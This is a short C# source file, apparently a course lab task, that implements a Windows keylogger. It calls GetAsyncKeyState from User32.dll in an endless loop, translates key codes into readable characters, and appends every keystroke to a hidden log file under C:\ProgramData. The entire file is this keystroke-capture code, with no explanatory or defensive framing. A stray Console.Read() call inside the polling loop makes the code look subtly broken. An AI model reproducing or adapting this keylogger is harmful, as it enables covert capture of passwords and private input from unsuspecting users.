using System;
using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace L4.Task1
{
    static class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int i);

        static void Main() 
        {
            while (true)
            {               
                for (int i = 0; i < 255; i++)
                {
                    Console.Read();
                    
                    if (GetAsyncKeyState(i) == 32769)
                    {
                        string key;

                        switch (((Keys)i).ToString())
                        {
                            case "OemPeriod":
                                key = ".";
                                break;
                            case "Oemcomma":
                                key = ",";
                                break;
                            case "Oemplus":
                                key = "+";
                                break;
                            case "OemMinus":
                                key = "-";
                                break;
                            case "Oemtilde":
                                key = "`";
                                break;
                            case "OemQuestion":
                                key = "?";
                                break;
                            case "Add":
                                key = "+";
                                break;
                            case "Divide":
                                key = "/";
                                break;
                            case "Multiply":
                                key = "*";
                                break;
                            case "Subtract":
                                key = "-";
                                break;
                            case "Decimal":
                                key = ".";
                                break;
                            case "D1":
                                key = "1";
                                break;
                            case "D2":
                                key = "2";
                                break;
                            case "D3":
                                key = "3";
                                break;
                            case "D4":
                                key = "4";
                                break;
                            case "D5":
                                key = "5";
                                break;
                            case "D6":
                                key = "6";
                                break;
                            case "D7":
                                key = "7";
                                break;
                            case "D8":
                                key = "8";
                                break;
                            case "D9":
                                key = "9";
                                break;
                            case "D0":
                                key = "0";
                                break;
                            case "NumLock":
                                key = "[NumLock]";
                                break;
                            case "NumPad1":
                                key = "1";
                                break;
                            case "NumPad2":
                                key = "2";
                                break;
                            case "NumPad3":
                                key = "3";
                                break;
                            case "NumPad4":
                                key = "4";
                                break;
                            case "NumPad5":
                                key = "5";
                                break;
                            case "NumPad6":
                                key = "6";
                                break;
                            case "NumPad7":
                                key = "7";
                                break;
                            case "NumPad8":
                                key = "8";
                                break;
                            case "NumPad9":
                                key = "9";
                                break;
                            case "NumPad0":
                                key = "0";
                                break;
                            case "Space":
                                key = " ";
                                break;
                            case "Return":
                                key = "\n";
                                break;
                            case "Back":
                                key = "[Backspace]";
                                break;
                            case "Left":
                                key = "←";
                                break;
                            case "Up":
                                key = "↑";
                                break;
                            case "Right":
                                key = "→";
                                break;
                            case "Down":
                                key = "↓";
                                break;
                            case "Escape":
                                key = "[Escape]";
                                break;
                            case "Tab":
                                key = "[Tab]";
                                break;
                            case "LShiftKey":
                                key = "[LShift]";
                                break;
                            case "ShiftKey":
                                key = "[Shift]";
                                break;
                            case "RShiftKey":
                                key = "[RShift]";
                                break;
                            case "LMenu":
                                key = "[LAlt]";
                                break;
                            case "Menu":
                                key = "[Alt]";
                                break;
                            case "RMenu":
                                key = "[RAlt]";
                                break;
                            case "LControlKey":
                                key = "[LControlKey]";
                                break;
                            case "ControlKey":
                                key = "[ControlKey]";
                                break;
                            case "RControlKey":
                                key = "[RControlKey]";
                                break;
                            case "Capital":
                                key = "[Capital]";
                                break;
                            default:
                                key = ((Keys)i).ToString();
                                break;
                        } 
                        
                        Console.Out.WriteLine(key);
                        StreamWriter output = new StreamWriter(@"C:\ProgramData\log.txt", true);
                        output.WriteLine(key);
                        output.Close();
                    }
                }
            }
        }

    }
}
